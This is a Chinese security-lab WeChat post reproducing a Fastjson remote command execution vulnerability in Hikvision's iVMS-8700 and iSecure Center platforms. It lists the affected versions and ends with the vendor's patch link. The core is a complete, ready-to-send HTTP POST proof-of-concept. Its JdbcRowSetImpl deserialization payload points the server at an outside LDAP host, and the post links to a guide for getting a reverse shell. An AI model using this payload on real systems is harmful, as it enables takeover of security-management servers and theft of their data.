#  海康威视综合安防管理平台远程命令执行漏洞（Fastjson）

原创 弥天安全实验室  [ 弥天安全实验室 ](javascript:void\(0\);)

**弥天安全实验室** ![]()

微信号 gh_41292c8e5379

功能介绍 学海浩茫，予以风动，必降弥天之润！

____

___发表于_

收录于合集

#漏洞 61 个

#复现 35 个

#POC 21 个

#海康威视 1 个

  

  

网安引领时代，弥天点亮未来  

  
  

  

  



![]()  
 **0x00写在前面**  
  
 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**![]()  
 **0x01漏洞介绍**  

#  海康威视部分综合安防管理平台管理平台基于 " 统一软件技术架构"
理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、配置、管理和调度。

该平台存在 **Fastjson** 远程命令执行漏洞，攻击者可通过构造恶意Payload执行并获取服务器系统权限以及敏感数据信息。

![]()  
 **0x02影响版本**  
  

V2.0.0 <= iVMS-8700 <= V2.9.2      V1.0.0 <= iSecure Center <= V1.7.0

  

  

![]()  
 **0x03漏洞复现**  
  

1.访问漏洞环境

![]()

2.对漏洞进行复现

 **   Poc （POST）**

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /bic/ssoService/v1/applyCT HTTP/1.1Host: 127.0.0.1Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-siteSec-Fetch-User: ?1Te: trailersContent-Type: application/jsonContent-Length: 204  
    {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://kjvqweuoav.dnstunnel.run","autoCommit":true},"hfe4zyyzldp":"="}

漏洞复现

POST请求，响应存在漏洞

![]()

  

        burp生成测试域名

![]()

3.反弹shell参考这篇文章。

[https://mp.weixin.qq.com/s/0pNLJZXFTPSbXy4TLWZxKQ](http://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247497068&idx=1&sn=fff335b0aa2427588270a7168625f07c&chksm=fc46600ecb31e9183201a681432a36a6576ed39c5c5e24aef26fb775e7abccbdbd90ca74d92d&scene=21#wechat_redirect)  

  

![]()  
 **0x04修复建议**  
  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

  * 

    
    
    https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/

  

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

![]()

  

知识分享完了

喜欢别忘了关注我们哦~

  

学海浩茫，予以风动，必降弥天之润！

  

   弥  天

安全实验室  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

